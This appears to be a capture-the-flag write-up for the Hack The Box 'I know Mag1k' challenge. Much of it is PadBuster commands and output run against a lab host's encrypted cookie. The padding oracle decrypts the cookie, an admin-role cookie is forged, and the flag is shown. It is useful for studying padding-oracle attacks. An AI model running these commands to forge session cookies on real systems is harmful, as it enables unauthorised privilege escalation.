'''
Register a user
See the cookies

iknowmag1k = JYNeuOPCQTAJWnX+Rl9PAGU+Xik9kjHS7YH9Lyc4MtB549FnLqEAJg==
base64 -d but it is a encrypted test

https://blog.51cto.com/u_15127492/2658538
https://medium.com/@mrkarthik07/i-know-mag1k-a-padding-oracle-attack-745d3b0bb2b1

padbuster

perl padBuster.pl http://206.189.125.80:30565/profile.php JYNeuOPCQTAJWnX+Rl9PAGU+Xik9kjHS7YH9Lyc4MtB549FnLqEAJg== 8 -cookies iknowmag1k=JYNeuOPCQTAJWnX+Rl9PAGU+Xik9kjHS7YH9Lyc4MtB549FnLqEAJg==

+-------------------------------------------+
| PadBuster - v0.3.3                        |
| Brian Holyfield - Gotham Digital Science  |
| labs@gdssecurity.com                      |
+-------------------------------------------+

INFO: The original request returned the following
[+] Status: 500
[+] Location: N/A
[+] Content Length: 0

INFO: Starting PadBuster Decrypt Mode
*** Starting Block 1 of 4 ***

INFO: No error string was provided...starting response analysis

*** Response Analysis Complete ***

The following response signatures were returned:

-------------------------------------------------------
ID#     Freq    Status  Length  Location
-------------------------------------------------------
1       1       302     0       login.php
2 **    255     500     0       N/A
-------------------------------------------------------

Enter an ID that matches the error condition
NOTE: The ID# marked with ** is recommended : 2

Continuing test with selection 2

[+] Success: (245/256) [Byte 8]
[+] Success: (159/256) [Byte 7]
[+] Success: (77/256) [Byte 6]
[+] Success: (126/256) [Byte 5]
[+] Success: (50/256) [Byte 4]
[+] Success: (211/256) [Byte 3]
[+] Success: (90/256) [Byte 2]
[+] Success: (170/256) [Byte 1]

Block 1 Results:
[+] Cipher Text (HEX): 095a75fe465f4f00
[+] Intermediate Bytes (HEX): 5ea12bcb86b0630a
[+] Plain Text: {"user":

Use of uninitialized value $plainTextBytes in concatenation (.) or string at padBuster.pl line 361, <STDIN> line 1.
*** Starting Block 2 of 4 ***

[+] Success: (147/256) [Byte 8]
[+] Success: (222/256) [Byte 7]
[+] Success: (210/256) [Byte 6]
[+] Success: (160/256) [Byte 5]
[+] Success: (41/256) [Byte 4]
[+] Success: (175/256) [Byte 3]
[+] Success: (196/256) [Byte 2]
[+] Success: (221/256) [Byte 1]

Block 2 Results:
[+] Cipher Text (HEX): 653e5e293d9231d2
[+] Intermediate Bytes (HEX): 2b3b57d2642d206c
[+] Plain Text: "a","rol

*** Starting Block 3 of 4 ***

[+] Success: (95/256) [Byte 8]
[+] Success: (170/256) [Byte 7]
[+] Success: (30/256) [Byte 6]
[+] Success: (180/256) [Byte 5]
[+] Success: (242/256) [Byte 4]
[+] Success: (158/256) [Byte 3]
[+] Success: (229/256) [Byte 2]
[+] Success: (248/256) [Byte 1]

Block 3 Results:
[+] Cipher Text (HEX): ed81fd2f273832d0
[+] Intermediate Bytes (HEX): 001c640b48e154a0
[+] Plain Text: e":"user

*** Starting Block 4 of 4 ***

[+] Success: (41/256) [Byte 8]
[+] Success: (202/256) [Byte 7]
[+] Success: (195/256) [Byte 6]
[+] Success: (219/256) [Byte 5]
[+] Success: (212/256) [Byte 4]
[+] Success: (3/256) [Byte 3]
[+] Success: (5/256) [Byte 2]
[+] Success: (57/256) [Byte 1]

Block 4 Results:
[+] Cipher Text (HEX): 79e3d1672ea10026
[+] Intermediate Bytes (HEX): cffcfb29213e34d6
[+] Plain Text: "}

-------------------------------------------------------
** Finished ***

[+] Decrypted value (ASCII): {"user":"a","role":"user"}

[+] Decrypted value (HEX): 7B2275736572223A2261222C22726F6C65223A2275736572227D060606060606

[+] Decrypted value (Base64): eyJ1c2VyIjoiYSIsInJvbGUiOiJ1c2VyIn0GBgYGBgY=

-------------------------------------------------------

perl padBuster.pl http://206.189.125.80:30565/profile.php JYNeuOPCQTAJWnX+Rl9PAGU+Xik9kjHS7YH9Lyc4MtB549FnLqEAJg== 8 -cookies iknowmag1k=JYNeuOPCQTAJWnX+Rl9PAGU+Xik9kjHS7YH9Lyc4MtB549FnLqEAJg== -plaintext "{\"user\":\"a\",\"role\":\"admin\"}"

+-------------------------------------------+
| PadBuster - v0.3.3                        |
| Brian Holyfield - Gotham Digital Science  |
| labs@gdssecurity.com                      |
+-------------------------------------------+

INFO: The original request returned the following
[+] Status: 500
[+] Location: N/A
[+] Content Length: 0

INFO: Starting PadBuster Encrypt Mode
[+] Number of Blocks: 4

INFO: No error string was provided...starting response analysis

*** Response Analysis Complete ***

The following response signatures were returned:

-------------------------------------------------------
ID#     Freq    Status  Length  Location
-------------------------------------------------------
1       1       302     0       login.php
2 **    255     500     0       N/A
-------------------------------------------------------

Enter an ID that matches the error condition
NOTE: The ID# marked with ** is recommended : 2

Continuing test with selection 2

[+] Success: (97/256) [Byte 8]
[+] Success: (155/256) [Byte 7]
[+] Success: (87/256) [Byte 6]
[+] Success: (153/256) [Byte 5]
[+] Success: (61/256) [Byte 4]
[+] Success: (188/256) [Byte 3]
[+] Success: (151/256) [Byte 2]
[+] Success: (167/256) [Byte 1]

Block 4 Results:
[+] New Cipher Text (HEX): 3f4c3fc366af629b
[+] Intermediate Bytes (HEX): 516e42c663aa679e

[+] Success: (170/256) [Byte 8]
[+] Success: (35/256) [Byte 7]
[+] Success: (245/256) [Byte 6]
[+] Success: (151/256) [Byte 5]
[+] Success: (77/256) [Byte 4]
[+] Success: (126/256) [Byte 3]
[+] Success: (155/256) [Byte 2]
[+] Success: (145/256) [Byte 1]

Block 3 Results:
[+] New Cipher Text (HEX): 0240be940c6cb23e
[+] Intermediate Bytes (HEX): 676284b66d08df57

[+] Success: (254/256) [Byte 8]
[+] Success: (78/256) [Byte 7]
[+] Success: (214/256) [Byte 6]
[+] Success: (226/256) [Byte 5]
[+] Success: (200/256) [Byte 4]
[+] Success: (117/256) [Byte 3]
[+] Success: (97/256) [Byte 2]
[+] Success: (3/256) [Byte 1]

Block 2 Results:
[+] New Cipher Text (HEX): d7f9af11385bdf6f
[+] Intermediate Bytes (HEX): f5988d3d1a29b003

[+] Success: (67/256) [Byte 8]
[+] Success: (205/256) [Byte 7]
[+] Success: (145/256) [Byte 6]
[+] Success: (191/256) [Byte 5]
[+] Success: (95/256) [Byte 4]
[+] Success: (2/256) [Byte 3]
[+] Success: (237/256) [Byte 2]
[+] Success: (244/256) [Byte 1]

Block 1 Results:
[+] New Cipher Text (HEX): 7f368dd7201e1386
[+] Intermediate Bytes (HEX): 0414f8a4456c31bc

-------------------------------------------------------
** Finished ***

[+] Encrypted value is: fzaN1yAeE4bX%2Ba8ROFvfbwJAvpQMbLI%2BP0w%2Fw2avYpsAAAAAAAAAAA%3D%3D
-------------------------------------------------------

Change the cookies to fzaN1yAeE4bX%2Ba8ROFvfbwJAvpQMbLI%2BP0w%2Fw2avYpsAAAAAAAAAAA%3D%3D

HTB{Padd1NG_Or4cl3z_AR3_WaY_T0o_6en3r0ys_ArenT_tHey???}

'''
